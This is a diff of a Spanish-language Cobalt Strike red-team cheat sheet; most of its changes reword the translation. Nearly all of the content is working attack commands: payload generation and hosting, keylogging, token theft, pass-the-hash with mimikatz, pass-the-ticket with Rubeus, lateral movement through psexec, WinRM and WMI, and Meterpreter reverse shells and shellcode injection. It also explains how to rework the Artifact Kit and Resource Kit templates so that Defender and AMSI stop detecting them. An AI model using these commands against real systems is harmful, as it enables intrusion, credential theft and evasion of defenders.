@@ -2,68 +2,68 @@
 
 ### Listeners
 
-### Listeners de C2
+### C2 Listeners
 
-`Cobalt Strike -> Listeners -> Add/Edit` y luego puedes seleccionar dónde escuchar, qué tipo de beacon usar (http, dns, smb...) y más.
+`Cobalt Strike -> Listeners -> Add/Edit` luego puedes seleccionar dónde escuchar, qué tipo de beacon usar (http, dns, smb...) y más.
 
-### Listeners Peer2Peer
+### Peer2Peer Listeners
 
-Los beacons de estos listeners no necesitan hablar directamente con el C2, pueden comunicarse a través de otros beacons.
+Los beacons de estos listeners no necesitan comunicarse directamente con el C2, pueden comunicarse a través de otros beacons.
 
-`Cobalt Strike -> Listeners -> Add/Edit` y luego debes seleccionar los beacons TCP o SMB.
+`Cobalt Strike -> Listeners -> Add/Edit` luego necesitas seleccionar los beacons TCP o SMB
 
-* El **beacon TCP establecerá un listener en el puerto seleccionado**. Para conectarse a un beacon TCP, usa el comando `connect <ip> <port>` desde otro beacon.
-* El **beacon SMB escuchará en un pipename con el nombre seleccionado**. Para conectarse a un beacon SMB, debes usar el comando `link [target] [pipe]`.
+* El **beacon TCP establecerá un listener en el puerto seleccionado**. Para conectarte a un beacon TCP usa el comando `connect <ip> <port>` desde otro beacon
+* El **beacon smb escuchará en un pipename con el nombre seleccionado**. Para conectarte a un beacon SMB necesitas usar el comando `link [target] [pipe]`.
 
-### Generar y alojar payloads
+### Generate & Host payloads
 
-#### Generar payloads en archivos
+#### Generate payloads in files
 
 `Attacks -> Packages ->`&#x20;
 
 * **`HTMLApplication`** para archivos HTA
-* **`MS Office Macro`** para un documento de Office con una macro
+* **`MS Office Macro`** para un documento de office con una macro
 * **`Windows Executable`** para un .exe, .dll o servicio .exe
-* **`Windows Executable (S)`** para un .exe, .dll o servicio .exe **sin etapas** (mejor sin etapas que con etapas, menos IoCs)
+* **`Windows Executable (S)`** para un **stageless** .exe, .dll o servicio .exe (mejor stageless que staged, menos IoCs)
 
-#### Generar y alojar payloads
+#### Generate & Host payloads
 
-`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Esto generará un script/ejecutable para descargar el beacon de cobalt strike en formatos como: bitsadmin, exe, powershell y python.
+`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Esto generará un script/executable para descargar el beacon de cobalt strike en formatos como: bitsadmin, exe, powershell y python
 
-#### Alojar payloads
+#### Host Payloads
 
-Si ya tienes el archivo que deseas alojar en un servidor web, simplemente ve a `Attacks -> Web Drive-by -> Host File` y selecciona el archivo a alojar y la configuración del servidor web.
+Si ya tienes el archivo que deseas alojar en un servidor web, solo ve a `Attacks -> Web Drive-by -> Host File` y selecciona el archivo para alojar y la configuración del servidor web.
 
-### Opciones de Beacon
+### Beacon Options
 
 <pre class="language-bash"><code class="lang-bash"># Ejecutar binario .NET local
 execute-assembly &#x3C;/path/to/executable.exe>
 
 # Capturas de pantalla
-printscreen    # Tomar una captura de pantalla única a través del método PrintScr
+printscreen    # Tomar una captura de pantalla única mediante el método PrintScr
 screenshot     # Tomar una captura de pantalla única
 screenwatch    # Tomar capturas de pantalla periódicas del escritorio
 ## Ve a Ver -> Capturas de pantalla para verlas
 
 # keylogger
 keylogger [pid] [x86|x64]
-## Ver > Pulsaciones de teclas para ver las teclas presionadas
+## Ver > Teclas presionadas para ver las teclas presionadas
 
-# portscan
+# escaneo de puertos
 portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inyectar acción de escaneo de puertos dentro de otro proceso
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # Powershell
-# Importar módulo Powershell
+# Importar módulo de Powershell
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;solo escribe aquí los comandos de powershell>
+powershell &#x3C;solo escribe el cmd de powershell aquí>
 
-# Impersonación de usuario
+# Suplantación de usuario
 ## Generación de token con credenciales
 make_token [DOMAIN\user] [password] #Crear token para suplantar a un usuario en la red
 ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
 rev2self # Dejar de usar el token generado con make_token
-## El uso de make_token genera el evento 4624: Se inició sesión correctamente en una cuenta. Este evento es muy común en un dominio de Windows, pero se puede reducir filtrando en el tipo de inicio de sesión. Como se mencionó anteriormente, utiliza LOGON32_LOGON_NEW_CREDENTIALS que es el tipo 9.
+## El uso de make_token genera el evento 4624: Una cuenta se ha iniciado sesión correctamente. Este evento es muy común en un dominio de Windows, pero se puede reducir filtrando por el Tipo de Inicio de Sesión. Como se mencionó anteriormente, utiliza LOGON32_LOGON_NEW_CREDENTIALS que es el tipo 9.
 
 # Bypass de UAC
 elevate svc-exe &#x3C;listener>
@@ -73,42 +73,134 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 ## Robar token de pid
 ## Como make_token pero robando el token de un proceso
 steal_token [pid] # Además, esto es útil para acciones de red, no para acciones locales
-## Desde la documentación de la API sabemos que este tipo de inicio de sesión "permite al llamador clonar su token actual". Es por eso que la salida de Beacon dice Impersonated &#x3C;current_username> - está suplantando nuestro propio token clonado.
+## De la documentación de la API sabemos que este tipo de inicio de sesión "permite al llamador clonar su token actual". Por eso la salida de Beacon dice Impersonated &#x3C;current_username> - está suplantando nuestro propio token clonado.
 ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
-rev2self # Dejar de usar el token generado con steal_token
+rev2self # Dejar de usar el token de steal_token
 
-## Ejecutar proceso con nuevas credenciales
+## Lanzar proceso con nuevas credenciales
 spawnas [domain\username] [password] [listener] #Hazlo desde un directorio con acceso de lectura como: cd C:\
-## Como make_token, esto generará el evento de Windows 4624: Se inició sesión correctamente en una cuenta, pero con un tipo de inicio de sesión de 2 (LOGON32_LOGON_INTERACTIVE). Detallará el usuario que llama (TargetUserName) y el usuario suplantado (TargetOutboundUserName).
+## Al igual que make_token, esto generará el evento de Windows 4624: Una cuenta se ha iniciado sesión correctamente pero con un tipo de inicio de sesión de 2 (LOGON32_LOGON_INTERACTIVE). Detallará el usuario que llama (TargetUserName) y el usuario suplantado (TargetOutboundUserName).
 
 ## Inyectar en proceso
 inject [pid] [x64|x86] [listener]
-## Desde un punto de vista de OpSec: No realices inyección entre plataformas a menos que realmente tengas que hacerlo (por ejemplo, x86 -> x64 o x64 -> x86).
+## Desde un punto de vista de OpSec: No realices inyección entre plataformas a menos que realmente sea necesario (por ejemplo, x86 -> x64 o x64 -> x86).
 
 ## Pasar el hash
-## Este proceso de modificación requiere parchear la memoria de LSASS, lo que es una acción de alto riesgo, requiere privilegios de administrador local y no es muy viable si Protected Process Light (PPL) está habilitado.
+## Este proceso de modificación requiere parchar la memoria de LSASS, lo cual es una acción de alto riesgo, requiere privilegios de administrador local y no es muy viable si Protected Process Light (PPL) está habilitado.
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
 ## Pasar el hash a través de mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como usuario con escritorio, verá
+## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como un usuario con Escritorio, verá el shell (si estás ejecutando como SYSTEM, estás bien)
+steal_token &#x3C;pid> #Robar token de proceso creado por mimikatz
+
+## Pasar el ticket
+## Solicitar un ticket
+execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
+## Crear una nueva sesión de inicio de sesión para usar con el nuevo ticket (para no sobrescribir el comprometido)
+make_token &#x3C;domain>\&#x3C;username> DummyPass
+## Escribir el ticket en la máquina del atacante desde una sesión de powershell &#x26; cargarlo
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
+kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
+
+## Pasar el ticket desde SYSTEM
+## Generar un nuevo proceso con el ticket
+execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+## Robar el token de ese proceso
+steal_token &#x3C;pid>
+
+## Extraer ticket + Pasar el ticket
+### Listar tickets
+execute-assembly C:\path\Rubeus.exe triage
+### Volcar ticket interesante por luid
+execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
+### Crear nueva sesión de inicio de sesión, anotar luid y processid
+execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+### Insertar ticket en la sesión de inicio de sesión generada
+execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
+### Finalmente, robar el token de ese nuevo proceso
+steal_token &#x3C;pid>
+
+# Movimiento Lateral
+## Si se creó un token, se utilizará
+jump [method] [target] [listener]
+## Métodos:
+## psexec                    x86   Usar un servicio para ejecutar un artefacto Service EXE
+## psexec64                  x64   Usar un servicio para ejecutar un artefacto Service EXE
+## psexec_psh                x86   Usar un servicio para ejecutar una línea de PowerShell
+## winrm                     x86   Ejecutar un script de PowerShell a través de WinRM
+## winrm64                   x64   Ejecutar un script de PowerShell a través de WinRM
+
+remote-exec [method] [target] [command]
+## Métodos:
+<strong>## psexec                          Ejecución remota a través del Administrador de Control de Servicios
+</strong>## winrm                           Ejecución remota a través de WinRM (PowerShell)
+## wmi                             Ejecución remota a través de WMI
+
+## Para ejecutar un beacon con wmi (no está en el comando jump) solo sube el beacon y ejecútalo
+beacon> upload C:\Payloads\beacon-smb.exe
+beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
+
+
+# Pasar sesión a Metasploit - A través de listener
+## En el host de metaploit
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
+msf6 exploit(multi/handler) > set LHOST eth0
+msf6 exploit(multi/handler) > set LPORT 8080
+msf6 exploit(multi/handler) > exploit -j
+
+## En cobalt: Listeners > Agregar y establecer el Payload en HTTP Extranjero. Establecer el Host en 10.10.5.120, el Puerto en 8080 y hacer clic en Guardar.
+beacon> spawn metasploit
+## Solo puedes generar sesiones Meterpreter x86 con el listener extranjero.
+
+# Pasar sesión a Metasploit - A través de inyección de shellcode
+## En el host de metasploit
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
+## Ejecutar msfvenom y preparar el listener multi/handler
+
+## Copiar archivo bin a host de cobalt strike
+ps
+shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inyectar shellcode de metasploit en un proceso x64
+
+# Pasar sesión de metasploit a cobalt strike
+## Generar shellcode Beacon stageless, ir a Attacks > Packages > Windows Executable (S), seleccionar el listener deseado, seleccionar Raw como tipo de salida y seleccionar Usar carga útil x64.
+## Usar post/windows/manage/shellcode_inject en metasploit para inyectar el shellcode generado de cobalt strike
+
+
+# Pivoting
+## Abrir un proxy socks en el teamserver
+beacon> socks 1080
+
+# Conexión SSH
+beacon> ssh 10.10.17.12:22 username password</code></pre>
+
+## Evitando AVs
+
+### Artifact Kit
+
+Usualmente en `/opt/cobaltstrike/artifact-kit` puedes encontrar el código y las plantillas precompiladas (en `/src-common`) de los payloads que cobalt strike va a usar para generar los beacons binarios.
+
+Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con la puerta trasera generada (o solo con la plantilla compilada) puedes encontrar qué está haciendo que el defensor se active. Generalmente es una cadena. Por lo tanto, solo puedes modificar el código que está generando la puerta trasera para que esa cadena no aparezca en el binario final.
+
+Después de modificar el código, solo ejecuta `./build.sh` desde el mismo directorio y copia la carpeta `dist-pipe/` en el cliente de Windows en `C:\Tools\cobaltstrike\ArtifactKit`.
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
-No olvides cargar el script agresivo `dist-pipe\artifact.cna` para indicarle a Cobalt Strike que use los recursos del disco que queremos y no los cargados.
+No olvides cargar el script agresivo `dist-pipe\artifact.cna` para indicar a Cobalt Strike que use los recursos del disco que queremos y no los que se cargan.
 
-### Kit de recursos
+### Kit de Recursos
 
-La carpeta ResourceKit contiene las plantillas para los payloads basados en scripts de Cobalt Strike, incluyendo PowerShell, VBA y HTA.
+La carpeta ResourceKit contiene las plantillas para las cargas útiles basadas en scripts de Cobalt Strike, incluyendo PowerShell, VBA y HTA.
 
-Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas, puedes encontrar qué es lo que el defensor (en este caso AMSI) no está aceptando y modificarlo:
+Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas, puedes encontrar qué es lo que no le gusta al defensor (AMSI en este caso) y modificarlo:
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
-Modificar las líneas detectadas permite generar una plantilla que no será detectada.
+Modificando las líneas detectadas, uno puede generar una plantilla que no será atrapada.
 
-No olvides cargar el script agresivo `ResourceKit\resources.cna` para indicarle a Cobalt Strike que use los recursos del disco que queremos y no los cargados.
+No olvides cargar el script agresivo `ResourceKit\resources.cna` para indicar a Cobalt Strike que use los recursos del disco que queremos y no los que están cargados.
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
